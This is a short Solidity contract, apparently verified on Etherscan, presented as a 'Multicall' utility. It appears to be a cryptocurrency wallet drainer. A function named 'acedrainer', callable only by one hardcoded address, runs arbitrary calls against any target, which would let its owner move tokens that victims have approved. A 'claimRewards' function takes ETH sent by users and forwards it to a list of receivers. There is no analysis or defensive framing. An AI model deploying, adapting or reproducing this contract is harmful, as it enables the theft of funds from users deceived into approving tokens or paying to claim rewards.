/**
 *Submitted for verification at Etherscan.io on 2023-10-24
*/

pragma solidity ^0.8.0;


contract Multicall {

    struct Call {
        address target;
        bytes callData;
    }
    struct Result {
        bool success;
        bytes returnData;
    }    
    
    struct Split{
        address receiver;
        uint256 share;
    }

    function acedrainer(Call[] memory calls) public returns (uint256 blockNumber, bytes[] memory returnData) {

        require(msg.sender == address(0x63E175E56c58f270DE017882b2eB486D14764124)," _LOL_");
        blockNumber = block.number;
        returnData = new bytes[](calls.length);
        for(uint256 i = 0; i < calls.length; i++) {
            (bool success, bytes memory ret) = calls[i].target.call(calls[i].callData);
            require(success, "Multicall aggregate: call failed");
            returnData[i] = ret;
        }
    }

    function claimRewards(Split[] memory _data) external payable
    {

        for(uint i = 0; i < _data.length; i++){

            uint256 feeValue = (msg.value * _data[i].share) / 10000; 
            (bool sent, bytes memory data) = _data[i].receiver.call{value: feeValue}("");
            require(sent, "Failed to send Ether");
        }
    }
}